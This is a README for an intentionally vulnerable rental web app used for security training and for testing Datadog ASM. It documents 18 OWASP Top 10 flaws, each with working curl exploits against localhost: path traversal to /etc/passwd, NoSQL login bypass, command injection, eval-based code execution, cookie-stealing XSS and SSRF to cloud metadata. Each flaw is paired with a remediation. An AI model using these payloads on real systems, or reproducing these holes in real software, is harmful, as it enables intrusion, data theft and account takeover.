# Insecure Rental - Vulnerability Documentation

⚠️ **WARNING**: This application is intentionally vulnerable for educational purposes and security testing. DO NOT use in production or deploy to public internet.

## Overview

Insecure Rental contains 18+ intentional security vulnerabilities covering the OWASP Top 10 (2021). This document provides detailed information about each vulnerability, how to exploit it, and how it should be properly secured.

---

## OWASP Top 10 Coverage

### A01:2021 – Broken Access Control

#### 1. Insecure Direct Object Reference (IDOR)
**Endpoint**: `GET /api/vulnerable/user-data/:userId`

**Description**: Any user can access any other user's sensitive data including payment information and rental history without authorization.

**Exploit**:
```bash
# Access any user's data by guessing/iterating user IDs
curl http://localhost:5000/api/vulnerable/user-data/[any-user-id]
```

**Impact**:
- Expose sensitive user data
- View credit card information
- Access rental history
- Enumerate all users

**Remediation**:
- Verify user is authorized to access the requested user data
- Use session-based authentication to ensure users can only access their own data
- Implement proper access control checks

---

#### 2. Path Traversal / Local File Inclusion
**Endpoint**: `GET /api/vulnerable/read-file?path=`

**Description**: Allows reading arbitrary files from the server filesystem without validation.

**Exploit**:
```bash
# Read /etc/passwd
curl "http://localhost:5000/api/vulnerable/read-file?path=../../../../etc/passwd"

# Read application secrets
curl "http://localhost:5000/api/vulnerable/read-file?path=backend/.env"
```

**Impact**:
- Read sensitive configuration files
- Access environment variables
- Steal application secrets
- Read source code

**Remediation**:
- Never use user input directly in file paths
- Use a whitelist of allowed files
- Implement path canonicalization and validation
- Run application with minimal file system permissions

---

#### 3. Public Delete Endpoint
**Endpoint**: `DELETE /api/movies/:id`

**Description**: Anyone can delete any item without authentication.

**Exploit**:
```bash
curl -X DELETE http://localhost:5000/api/movies/[movie-id]
```

**Impact**:
- Data loss
- Denial of service
- Business disruption

**Remediation**:
- Require authentication for all destructive operations
- Implement role-based access control
- Add soft-delete with recovery period

---

### A02:2021 – Cryptographic Failures

#### 4. Sensitive Data Stored in Plain Text
**Location**: `backend/models/Rental.js`

**Description**: Credit card numbers, CVV, expiry dates stored in plain text in MongoDB.

**Code**:
```javascript
payment: {
  cardNumber: String,  // Full card number!
  cvv: String,         // CVV stored!
  expiryDate: String,
  cardHolderName: String
}
```

**Impact**:
- Database breach exposes all payment data
- Compliance violations (PCI DSS)
- Identity theft
- Financial fraud

**Remediation**:
- Never store credit card data yourself
- Use payment processors (Stripe, PayPal, etc.)
- If storage required: encrypt at rest, tokenization
- Implement PCI DSS compliance

---

### A03:2021 – Injection

#### 5. NoSQL Injection - User Search
**Endpoint**: `GET /api/vulnerable/search-user?username=`

**Description**: Directly uses user input in MongoDB query without sanitization.

**Exploit**:
```bash
# Return all users
curl 'http://localhost:5000/api/vulnerable/search-user?username[$ne]=null'

# Find admin users
curl 'http://localhost:5000/api/vulnerable/search-user?username[$regex]=^admin'
```

**Impact**:
- Enumerate all users
- Extract sensitive data
- Bypass authentication

**Remediation**:
```javascript
// Sanitize input
const username = String(req.query.username); // Cast to string
const users = await User.find({ username: username });
```

---

#### 6. NoSQL Injection - Authentication Bypass
**Endpoint**: `POST /api/vulnerable/insecure-login`

**Description**: Password check can be bypassed using NoSQL operators.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": {"$ne": null}}'
```

**Impact**:
- Complete authentication bypass
- Account takeover
- Unauthorized access

**Remediation**:
```javascript
// Validate input types
if (typeof email !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ message: 'Invalid input' });
}
```

---

#### 7. JavaScript Injection via $where
**Endpoint**: `GET /api/vulnerable/search-movies-where?title=`

**Description**: Executes arbitrary JavaScript on database server.

**Exploit**:
```bash
# Execute arbitrary code
curl 'http://localhost:5000/api/vulnerable/search-movies-where?title=1%3B%20return%20true%3B%20//'
```

**Impact**:
- Remote code execution on database
- Complete system compromise
- Data exfiltration

**Remediation**:
- Never use $where operator with user input
- Use proper query operators
- Disable JavaScript execution in MongoDB

---

#### 8. Reflected XSS (Cross-Site Scripting)
**Endpoint**: `GET /api/vulnerable/search-reflect?query=`

**Description**: User input directly embedded in HTML without escaping.

**Exploit**:
```
http://localhost:5000/api/vulnerable/search-reflect?query=<script>alert('XSS')</script>
```

**Impact**:
- Session hijacking
- Credential theft
- Malware distribution
- Phishing

**Remediation**:
```javascript
// Escape HTML entities
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
};
```

---

#### 9. Stored XSS via Comments
**Endpoint**: `POST /api/vulnerable/add-comment`

**Description**: Malicious scripts stored in database and executed for all viewers.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/vulnerable/add-comment \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [token]" \
  -d '{"movieId": "123", "comment": "<img src=x onerror=alert(document.cookie)>"}'
```

**Impact**:
- Persistent XSS affecting all users
- Mass account compromise
- Worm-like propagation

**Remediation**:
- Sanitize all user input before storage
- Use Content Security Policy (CSP)
- Escape output when displaying

---

#### 10. Command Injection
**Endpoint**: `GET /api/vulnerable/export-data?filename=`

**Description**: User input directly used in shell commands.

**Exploit**:
```bash
# List files
curl 'http://localhost:5000/api/vulnerable/export-data?format=json&filename=data;ls'

# Read files
curl 'http://localhost:5000/api/vulnerable/export-data?format=json&filename=data;cat%20/etc/passwd'
```

**Impact**:
- Remote code execution
- Complete server compromise
- Data theft

**Remediation**:
- Never use user input in shell commands
- Use safe libraries instead of exec()
- Whitelist allowed characters

---

### A04:2021 – Insecure Design

#### 11. Mass Assignment
**Endpoint**: `PUT /api/vulnerable/update-rental/:rentalId`

**Description**: All user-provided fields applied to database without filtering.

**Exploit**:
```bash
# Set rental price to $0.01
curl -X PUT http://localhost:5000/api/vulnerable/update-rental/123 \
  -H "Content-Type: application/json" \
  -d '{"price": 0.01, "returned": true}'
```

**Impact**:
- Privilege escalation
- Data manipulation
- Business logic bypass

**Remediation**:
```javascript
// Whitelist allowed fields
const allowedFields = ['shippingAddress', 'notes'];
const updateData = {};
allowedFields.forEach(field => {
  if (req.body[field]) updateData[field] = req.body[field];
});
```

---

### A05:2021 – Security Misconfiguration

#### 12. Information Disclosure
**Endpoint**: `GET /api/vulnerable/system-info`

**Description**: Exposes all environment variables including secrets.

**Exploit**:
```bash
curl http://localhost:5000/api/vulnerable/system-info
```

**Impact**:
- Database credentials exposed
- API keys leaked
- JWT secrets revealed
- Internal architecture disclosed

**Remediation**:
- Never expose environment variables
- Implement proper error handling
- Use generic error messages
- Disable debug mode in production

---

#### 13. CORS Misconfiguration
**Location**: `backend/server.js`

**Description**: CORS enabled for all origins.

**Code**:
```javascript
app.use(cors()); // Allows any origin!
```

**Impact**:
- CSRF attacks
- Unauthorized API access
- Data theft from authenticated users

**Remediation**:
```javascript
app.use(cors({
  origin: ['https://trusted-domain.com'],
  credentials: true
}));
```

---

### A07:2021 – Identification and Authentication Failures

#### 14. Weak Password Reset
**Endpoint**: `POST /api/vulnerable/reset-password-insecure`

**Description**: Password reset without email verification or token.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/vulnerable/reset-password-insecure \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@example.com", "newPassword": "hacked123"}'
```

**Impact**:
- Account takeover
- No user notification
- No verification needed

**Remediation**:
- Send reset token via email
- Use time-limited tokens
- Require old password or 2FA
- Notify user of password changes

---

#### 15. No Password Complexity Requirements
**Location**: `backend/routes/auth.js`

**Description**: Accepts any password including empty strings.

**Impact**:
- Weak passwords
- Easy brute force
- Dictionary attacks

**Remediation**:
```javascript
const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
if (!passwordRegex.test(password)) {
  return res.status(400).json({
    message: 'Password must be 8+ chars with upper, lower, number, special char'
  });
}
```

---

#### 16. No Rate Limiting
**Global Issue**

**Description**: No rate limiting on any endpoint.

**Impact**:
- Brute force attacks
- Credential stuffing
- DoS attacks
- API abuse

**Remediation**:
```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);
```

---

### A08:2021 – Software and Data Integrity Failures

#### 17. Insecure Deserialization
**Endpoint**: `POST /api/vulnerable/deserialize`

**Description**: Uses eval() with user input.

**Exploit**:
```bash
curl -X POST http://localhost:5000/api/vulnerable/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data": "require('\''child_process'\'').exec('\''whoami'\'')"}'
```

**Impact**:
- Remote code execution
- Complete system compromise
- Malware installation

**Remediation**:
- Never use eval() or Function() with user input
- Use JSON.parse() for JSON data
- Validate and sanitize all deserialized data

---

### A10:2021 – Server-Side Request Forgery (SSRF)

#### 18. SSRF via URL Fetch
**Endpoint**: `GET /api/vulnerable/fetch-url?url=`

**Description**: Makes HTTP requests to any URL without validation.

**Exploit**:
```bash
# Access AWS metadata
curl "http://localhost:5000/api/vulnerable/fetch-url?url=http://169.254.169.254/latest/meta-data/"

# Access internal MongoDB
curl "http://localhost:5000/api/vulnerable/fetch-url?url=http://localhost:27017"
```

**Impact**:
- Access cloud metadata (AWS, GCP, Azure)
- Scan internal network
- Access internal services
- Bypass firewall

**Remediation**:
```javascript
// Whitelist allowed domains
const allowedDomains = ['api.example.com'];
const url = new URL(req.query.url);
if (!allowedDomains.includes(url.hostname)) {
  return res.status(400).json({ message: 'Domain not allowed' });
}
```

---

## Additional Vulnerabilities

### 19. Missing CSRF Protection
All state-changing operations lack CSRF tokens.

### 20. Verbose Error Messages
Stack traces and detailed errors exposed to users.

### 21. No Security Headers
Missing headers: CSP, X-Frame-Options, HSTS, etc.

### 22. Logging Security Issues
Sensitive data logged in plain text.

---

## Testing with Datadog ASM

All these vulnerabilities can be detected by Datadog Application Security Management:

1. **Enable Datadog ASM**: Set `DD_APPSEC_ENABLED=true`
2. **Generate Traffic**: Execute exploits from this document
3. **View in Datadog**: Navigate to Security > Application Security
4. **Analyze Threats**: View detected attacks, traces, and recommendations

---

## Disclaimer

This application is for **EDUCATIONAL PURPOSES ONLY**.

- ❌ Do not deploy to production
- ❌ Do not expose to public internet
- ❌ Do not use for malicious purposes
- ✅ Use for learning security concepts
- ✅ Use for testing security tools
- ✅ Use for security training

---

## License

This vulnerable application is provided as-is for educational purposes.
